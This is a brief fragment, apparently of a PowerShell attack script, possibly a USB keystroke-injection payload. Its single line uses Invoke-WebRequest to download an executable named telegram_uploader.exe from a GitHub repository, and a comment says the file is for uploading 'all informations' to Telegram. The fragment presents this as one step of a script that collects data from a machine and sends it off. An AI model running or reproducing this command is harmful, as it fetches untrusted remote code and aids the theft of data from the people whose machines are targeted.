...
Invoke-WebRequest https://github.com/pavelvpgg1/goodUSB/raw/refs/heads/main/telegram_uploader.exe -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
